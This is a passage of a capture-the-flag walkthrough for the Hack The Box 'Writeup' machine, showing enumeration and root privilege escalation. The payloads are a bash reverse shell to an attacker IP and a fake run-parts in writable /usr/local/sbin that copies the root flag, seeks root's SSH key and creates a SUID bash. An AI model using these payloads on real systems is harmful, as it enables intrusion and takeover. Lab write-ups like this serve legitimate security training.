# Shell as jkr

I did some initial manual enumeration, checking for `sudo` capabilities, interesting running processes, and cron jobs:

```bash
jkr@writeup:~$ sudo -l
-bash: sudo: command not found
jkr@writeup:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  15796  1808 ?        Ss   15:09   0:00 init [2]
...[snip]...
root      1310  0.0  0.2 250108  2372 ?        Ssl  15:09   0:00 /usr/sbin/rsyslogd
root      1452  0.0  1.0 163432 10740 ?        Sl   15:09   0:03 /usr/sbin/vmtoolsd
root      1487  0.0  1.0  66316 10420 ?        S    15:09   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root      1570  0.0  2.8 330848 29260 ?        Ss   15:09   0:00 /usr/sbin/apache2 -k start
root      1630  0.0  0.2  29664  2516 ?        Ss   15:09   0:00 /usr/sbin/cron
message+  1646  0.0  0.2  32744  2480 ?        Ss   15:09   0:00 /usr/bin/dbus-daemon --system
root      1686  0.0  0.2  28528  2992 ?        S    15:09   0:00 /usr/sbin/elogind -D
root      1757  0.0  0.2   9776  2824 ?        S    15:09   0:00 /bin/bash /usr/bin/mysqld_safe
root      1781  0.0  1.5 431436 16000 ?        Sl   15:09   0:02 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -b
mysql     1934  0.0  7.8 654008 80284 ?        Sl   15:09   0:03 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb18/plugin --user=mysql --skip-log
root      1935  0.0  0.0   4192   708 ?        S    15:09   0:00 logger -t mysqld -p daemon error
root      1978  0.0  0.3  69952  3856 ?        Ss   15:09   0:00 /usr/sbin/sshd
root      2047  0.0  0.1  14520  1708 tty1     Ss+  15:09   0:00 /sbin/getty 38400 tty1
root      2048  0.0  0.1  14520  1696 tty2     Ss+  15:09   0:00 /sbin/getty 38400 tty2
root      2049  0.0  0.1  14520  1872 tty3     Ss+  15:09   0:00 /sbin/getty 38400 tty3
root      2050  0.0  0.1  14520  1776 tty4     Ss+  15:09   0:00 /sbin/getty 38400 tty4
root      2051  0.0  0.1  14520  1872 tty5     Ss+  15:09   0:00 /sbin/getty 38400 tty5
root      2052  0.0  0.1  14520  1708 tty6     Ss+  15:09   0:00 /sbin/getty 38400 tty6
root      2148  0.0  0.0      0     0 ?        S    15:10   0:00 [kauditd]
www-data  2581  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2582  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2583  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2584  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2585  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2586  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
root      2609  0.0  0.0      0     0 ?        S    16:27   0:00 [kworker/0:1]
root      2625  0.0  0.0      0     0 ?        S    16:32   0:00 [kworker/0:0]
root      2629  0.0  0.7 108796  7292 ?        Ss   16:33   0:00 sshd: jkr [priv]
jkr       2635  0.0  0.3 108796  3988 ?        S    16:33   0:00 sshd: jkr@pts/0
jkr       2636  0.0  0.3  19884  3768 pts/0    Ss   16:33   0:00 -bash
jkr       2653  0.0  0.2  19188  2484 pts/0    R+   16:36   0:00 ps aux
jkr@writeup:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && /bin/run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.monthly )
```

There were a few root processes, including `cron`, but no jobs specified.

## Linpeas

I switched to Linpeas:

```bash
jkr@writeup:/tmp$ cd /tmp && wget http://10.10.16.211:8000/linpeas.sh
--2021-07-15 16:39:22--  http://10.10.16.211:8000/linpeas.sh
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325084 (317K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                         100%[=============================================================================================================>] 317.46K  1.29MB/s    in 0.2s    

2021-07-15 16:39:23 (1.29 MB/s) - ‘linpeas.sh’ saved [325084/325084]

jkr@writeup:/tmp$ chmod +x linpeas.sh 
jkr@writeup:/tmp$ ./linpeas.sh 
```

### Highlights

```
[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
-rw-r--r-- 1 root root  742 Oct  7  2017 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rw-r--r--  1 root root  702 Apr 19  2019 php
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.daily:
total 36
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rwxr-xr-x  1 root root  539 Nov  3  2018 apache2
-rwxr-xr-x  1 root root 1474 Sep 13  2017 apt-compat
-rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils
-rwxr-xr-x  1 root root 1597 Feb 22  2017 dpkg
-rwxr-xr-x  1 root root   89 May  5  2015 logrotate
-rwxr-xr-x  1 root root  249 May 17  2017 passwd
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.weekly:
total 12
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

`PATH=/usr/local/sbin:/usr/local/bin:` in the cron definition was highlighted, which I'd come back to.

It also found a local `mysql` instance:

```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0   2364 10.10.10.138:22         10.10.16.211:43550      ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -          
```

`/usr/local/lib` was also highlighted:

```bash
[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
```

There were some group writeable files:

```bash
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group jkr:

  Group cdrom:

  Group floppy:

  Group audio:

  Group dip:

  Group video:

  Group plugdev:

  Group staff:
/var/local
/usr/local
/usr/local/bin
/usr/local/include
/usr/local/share
/usr/local/share/sgml
/usr/local/share/sgml/misc
/usr/local/share/sgml/stylesheet
/usr/local/share/sgml/entities
/usr/local/share/sgml/dtd
/usr/local/share/sgml/declaration
/usr/local/share/fonts
/usr/local/share/man
/usr/local/share/emacs
/usr/local/share/emacs/site-lisp
/usr/local/share/xml
/usr/local/share/xml/schema
/usr/local/share/xml/misc
/usr/local/share/xml/entities
/usr/local/share/xml/declaration
/usr/local/games
/usr/local/src
/usr/local/etc
/usr/local/lib
/usr/local/lib/python3.5
/usr/local/lib/python3.5/dist-packages
/usr/local/lib/python2.7
/usr/local/lib/python2.7/dist-packages
/usr/local/lib/python2.7/site-packages
/usr/local/sbin
  Group netdev:
```

`bin`, `games`, `sbin` were all highlighted - this leads me to think there is a `cron` exploit of some kind.

Finally, it also found a password hash:

```bash
[+] Searching specific hashes inside files - less false positives (limit 70)
/etc/apache2/passwords:$apr1$zXpnkbX6$LPzyE8Wa0d1yNQ4/F8aQa.
```

## Exploiting cron

I spent a bit of time figuring this out, but as always you can skip to the [[#Hijacking run-parts|working exploit]].

We'll run `pspy` to see what's happening on the box:

```bash
jkr@writeup:/tmp$ wget http://10.10.16.211:8000/pspy64
--2021-07-15 16:46:49--  http://10.10.16.211:8000/pspy64
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                             100%[=============================================================================================================>]   2.94M  1.40MB/s    in 2.1s    c

2021-07-15 16:46:52 (1.40 MB/s) - ‘pspy64’ saved [3078592/3078592]

jkr@writeup:/tmp$ chmod +x pspy64 
jkr@writeup:/tmp$ ./pspy64 
```

We see the cron jobs pop up, running `/root/bin/cleanup.pl`:

```
2021/07/15 16:48:01 CMD: UID=0    PID=12568  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2021/07/15 16:49:01 CMD: UID=0    PID=12569  | /usr/sbin/CRON 
2021/07/15 16:49:01 CMD: UID=0    PID=12570  | /usr/sbin/CRON 
2021/07/15 16:49:01 CMD: UID=0    PID=12571  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2021/07/15 16:50:01 CMD: UID=0    PID=12572  | /usr/sbin/CRON 
2021/07/15 16:50:01 CMD: UID=0    PID=12573  | /usr/sbin/CRON 
```

I couldn't read the file:

```bash
jkr@writeup:~$ cat /root/bin/cleanup.pl
cat: /root/bin/cleanup.pl: Permission denied
```

`/bin/sh` is absolute, so we can't just make a new file in the path and hijack the root call.

Eventually I logged via in from another terminal tab to checkout the script, and it triggered a Message of the Day:

```bash
2021/07/15 16:50:13 CMD: UID=102  PID=12576  | sshd: [net]       
2021/07/15 16:50:45 CMD: UID=0    PID=12577  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:50:45 CMD: UID=0    PID=12578  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:50:45 CMD: UID=0    PID=12579  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/15 16:50:45 CMD: UID=0    PID=12580  | uname -rnsom 
2021/07/15 16:50:45 CMD: UID=0    PID=12581  | sshd: jkr [priv]  
```

`uname` is called without an absolute path - could we write a malicious `uname` binary that gives us a shell?

```bash
jkr@writeup:~$ which bash
/bin/bash
jkr@writeup:~$ echo 'bash -i >& /dev/tcp/10.10.14.211/9001 0>&1' > /usr/local/sbin/uname
```

I tried to trigger this by logging in in another pane, but didn't get a shell.

After some more enumeration, it looks like uname was called by someone else working on the box, and this was just a coincidence after I logged in - it didn't trigger a second time:

```bash
2021/07/15 16:56:20 CMD: UID=102  PID=12611  | sshd: [net]       
2021/07/15 16:56:32 CMD: UID=0    PID=12612  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:56:32 CMD: UID=0    PID=12613  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:56:32 CMD: UID=0    PID=12614  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/15 16:56:32 CMD: UID=0    PID=12615  | 
2021/07/15 16:56:32 CMD: UID=0    PID=12616  | sshd: jkr [priv]  
2021/07/15 16:56:32 CMD: UID=1000 PID=12617  | sshd: jkr@pts/1   
2021/07/15 16:56:32 CMD: UID=1000 PID=12618  | -bash 
2021/07/15 16:56:32 CMD: UID=1000 PID=12619  | -bash 
2021/07/15 16:56:32 CMD: UID=1000 PID=12620  | -bash 
2021/07/15 16:56:32 CMD: UID=1000 PID=12621  | -bash 
2021/07/15 16:57:01 CMD: UID=0    PID=12622  | /usr/sbin/CRON 
2021/07/15 16:57:01 CMD: UID=0    PID=12623  | /usr/sbin/CRON 
2021/07/15 16:57:01 CMD: UID=0    PID=12624  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2021/07/15 16:57:02 CMD: UID=0    PID=12625  | sshd: [accepted]
2021/07/15 16:57:02 CMD: UID=0    PID=12626  | sshd: [accepted]  
2021/07/15 16:57:06 CMD: UID=0    PID=12627  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:57:06 CMD: UID=0    PID=12628  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 16:57:06 CMD: UID=0    PID=12629  | run-parts --lsbsysinit /etc/update-motd.d 
```

This is a lesson to always try things twice before you jump down a rabbit hole.

### Hijacking run-parts

The consistently run commands are the `run-parts` commands:

```bash
2021/07/15 17:14:46 CMD: UID=0    PID=12695  | sshd: jkr [priv]  
2021/07/15 17:14:46 CMD: UID=0    PID=12696  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 17:14:46 CMD: UID=0    PID=12697  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/15 17:14:46 CMD: UID=0    PID=12698  | 
2021/07/15 17:14:46 CMD: UID=0    PID=12699  | sshd: jkr [priv]  
2021/07/15 17:14:46 CMD: UID=1000 PID=12700  | -bash 
2021/07/15 17:14:46 CMD: UID=1000 PID=12701  | -bash 
2021/07/15 17:14:46 CMD: UID=1000 PID=12702  | -bash 
2021/07/15 17:14:46 CMD: UID=1000 PID=12703  | -bash 
2021/07/15 17:14:46 CMD: UID=1000 PID=12704  | -bash 
2021/07/15 17:15:01 CMD: UID=0    PID=12705  | /usr/sbin/CRON 
2021/07/15 17:15:01 CMD: UID=0    PID=12706  | /usr/sbin/CRON 
2021/07/15 17:15:01 CMD: UID=0    PID=12707  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
```

So I tried hijacking this binary instead:

```bash
jkr@writeup:~$ echo 'bash -i >& /dev/tcp/10.10.14.211/9001 0>&1' > /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

The idea behind this exploit is to write a new `run-parts` binary to the `/usr/local/sbin/` directory, which is a higher priority on the path than the usual `run-parts` binary. This means that when the MOTD script triggers our code will be run.

I tried this a few times, watching `pspy` to check if the `echo` command was run as root. One of the issues that I ran into was that the `chmod +x` permissions wouldn't persist after the cleanup script was run, so I had to be fast logging in after modifying it. Another issue was that my replacemenet script didn't seem to trigger unless it had a shebang (which I spotted 0xdf adding after I checked his writeup to make sure I was on the right track).

I tried again, checking the file still existed before I logged in:

```bash
jkr@writeup:~$ echo '#!/bin/sh' > /usr/local/sbin/run-parts
jkr@writeup:~$ echo 'cat /root/root.txt > /tmp/twig' >> /usr/local/sbin/run-parts
jkr@writeup:~$ cat /usr/local/sbin/run-parts
#!/bin/sh
cat /root/root.txt > /tmp/
jkr@writeup:~$ ls -la /usr/local/sbin/run-parts
-rw-r--r-- 1 jkr staff 41 Jul 15 17:27 /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

Then I logged in to trigger it, and checked if the flag had been copied:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 15 17:28:17 2021 from 10.10.16.211
jkr@writeup:~$ cat /tmp/twig 
eeba47f60b48ef92b734f9b6198d7226
```

Nice! We have code execution, and can read the flag.

That's the box!

![[Pasted image 20210715222444.png]]

But can we get a root shell?

### Getting a Shell

I first tried getting a root SSH key, in case it existed:

```
jkr@writeup:~$ echo '#!/bin/sh' > /usr/local/sbin/run-parts
jkr@writeup:~$ echo 'cat /root/.ssh/id_rsa > /tmp/twig' >> /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

There was nothing:

```
jkr@writeup:~$ cat /tmp/twig 
jkr@writeup:~$ 
```

As I'd finished the box, I thought I'd check methods other people had used. [0xdf](https://0xdf.gitlab.io/2019/10/12/htb-writeup.html) copies `bash` and gives it u+s permissions (SUID, to let it run as root). I tried to replicate this, without checking 0xdf's actual script:

```bash
jkr@writeup:~$ echo '#!/bin/sh' > /usr/local/sbin/run-parts
jkr@writeup:~$ echo 'cp /bin/bash /tmp/twig && chmod u+s /tmp/twig' >> /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

This worked:

```bash
jkr@writeup:~$ /tmp/twig
-bash: /tmp/twig: Permission denied
jkr@writeup:~$ ls -la /tmp/
total 4420
drwxrwxrwt  4 root root    4096 Jul 15 17:36 .
drwxr-xr-x 22 root root    4096 Apr 19  2019 ..
-rwxr-xr-x  1 jkr  jkr   325084 Feb 11 10:48 linpeas.sh
-rwxr-xr-x  1 jkr  jkr  3078592 Jun 20  2020 pspy64
-rwSr--r--  1 root root 1099016 Jul 15 17:36 twig
drwx------  2 root root    4096 Jul 15 15:09 vmware-root
drwx------  2 root root    4096 Jul 15 15:09 vmware-root_1452-2731021070
jkr@writeup:~$ ls -la /tmp/twig
-rwSr--r-- 1 root root 1099016 Jul 15 17:36 /tmp/twig
```

But it wasn't executable:

```bash
jkr@writeup:~$ /tmp/twig
twig-4.4$ whoami
jkr
twig-4.4$ 
```

We can see it working in pspy which is cool:

```bash
2021/07/15 17:37:29 CMD: UID=0    PID=12918  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/15 17:37:29 CMD: UID=0    PID=12919  | cp /bin/bash /tmp/twig 
2021/07/15 17:37:29 CMD: UID=0    PID=12920  | chmod u+s /tmp/twig 
2021/07/15 17:37:29 CMD: UID=0    PID=12921  | /bin/sh /usr/local/sbin/run-parts --lsbsysinit /etc/update-motd.d 
2021/07/15 17:37:29 CMD: UID=0    PID=12922  | sshd: jkr [priv]  
2021/07/15 17:37:29 CMD: UID=1000 PID=12923  | -bash 
2021/07/15 17:37:29 CMD: UID=1000 PID=12924  | -bash 
2021/07/15 17:37:29 CMD: UID=1000 PID=12925  | -bash 
2021/07/15 17:37:29 CMD: UID=1000 PID=12926  | -bash 
2021/07/15 17:37:29 CMD: UID=1000 PID=12927  | -bash 
2021/07/15 17:37:34 CMD: UID=1000 PID=12928  | -bash 
2021/07/15 17:37:36 CMD: UID=1000 PID=12929  | /tmp/twig 
2021/07/15 17:38:01 CMD: UID=0    PID=12930  | /usr/sbin/CRON 
2021/07/15 17:38:01 CMD: UID=0    PID=12931  | /usr/sbin/CRON 
2021/07/15 17:38:01 CMD: UID=0    PID=12932  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
```

I remade the payload, adding executable permissions:

```bash
jkr@writeup:~$ echo '#!/bin/sh' > /usr/local/sbin/run-parts
jkr@writeup:~$ echo 'cp /bin/bash /tmp/twig && chmod u+s /tmp/twig && chmod +x /tmp/twig' >> /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

I then ran it - I just had to tell bash not to drop privileges with the `-p` flag!

![[Pasted image 20210715223211.png]]

We can also confirm there's no ssh key while we're here:

```bash
twig-4.4# ls -la /root/.ssh
ls: cannot access '/root/.ssh': No such file or directory
```